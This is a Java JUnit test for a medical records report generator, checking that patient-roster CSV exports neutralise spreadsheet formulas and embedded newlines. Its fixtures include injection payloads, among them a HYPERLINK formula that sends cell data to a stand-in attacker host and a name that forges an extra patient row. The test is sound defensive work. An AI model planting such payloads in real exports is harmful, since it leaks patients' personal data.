package com.medchart.ehr.legacy;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;

import javax.persistence.EntityManager;
import javax.persistence.Query;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

class ReportGeneratorTest {

    private Path generated;

    @AfterEach
    void cleanUp() throws Exception {
        if (generated != null) Files.deleteIfExists(generated);
    }

    @Test
    void patientRosterNeutralisesFormulasAndKeepsOneLinePerPatient() throws Exception {
        List<Object[]> rows = Arrays.asList(
                patient(1L, "MRN0001", "111-11-1111", "=1+1", "Doe"),
                patient(2L, "MRN0002", "222-22-2222", "Eve", "Smith\nMRN9999,999-99-9999,Forged,Row"),
                patient(3L, "MRN0003", "333-33-3333", "=HYPERLINK(\"http://evil.example/?\"&C2&D2)", "O\"Brien, Jr."));

        generated = Path.of(generatorReturning(rows).generatePatientRoster());
        List<String> lines = Files.readAllLines(generated, StandardCharsets.UTF_8);

        assertEquals(rows.size() + 1, lines.size());
        List<String> first = parse(lines.get(1));
        assertEquals(15, first.size());
        assertEquals("'=1+1", first.get(3));

        List<String> second = parse(lines.get(2));
        assertEquals(15, second.size());
        assertEquals("Smith MRN9999,999-99-9999,Forged,Row", second.get(4));

        List<String> third = parse(lines.get(3));
        assertEquals(15, third.size());
        assertEquals("'=HYPERLINK(\"http://evil.example/?\"&C2&D2)", third.get(3));
        assertEquals("O\"Brien, Jr.", third.get(4));
    }

    private static ReportGenerator generatorReturning(List<Object[]> rows) {
        Query query = mock(Query.class);
        when(query.getResultList()).thenReturn(rows);
        EntityManager entityManager = mock(EntityManager.class);
        when(entityManager.createNativeQuery(anyString())).thenReturn(query);
        ReportGenerator generator = new ReportGenerator();
        ReflectionTestUtils.setField(generator, "entityManager", entityManager);
        return generator;
    }

    private static Object[] patient(Long id, String mrn, String ssn, String first, String last) {
        return new Object[] {id, mrn, ssn, first, last, "1980-01-01", null, null, "a@example.com",
                "1 Main St", "Springfield", "IL", "62701", "Acme", "M1"};
    }

    private static List<String> parse(String line) {
        List<String> fields = new ArrayList<>();
        StringBuilder current = new StringBuilder();
        boolean quoted = false;
        for (int i = 0; i < line.length(); i++) {
            char c = line.charAt(i);
            if (quoted) {
                if (c == '"' && i + 1 < line.length() && line.charAt(i + 1) == '"') {
                    current.append('"');
                    i++;
                } else if (c == '"') {
                    quoted = false;
                } else {
                    current.append(c);
                }
            } else if (c == '"') {
                quoted = true;
            } else if (c == ',') {
                fields.add(current.toString());
                current.setLength(0);
            } else {
                current.append(c);
            }
        }
        fields.add(current.toString());
        return fields;
    }
}
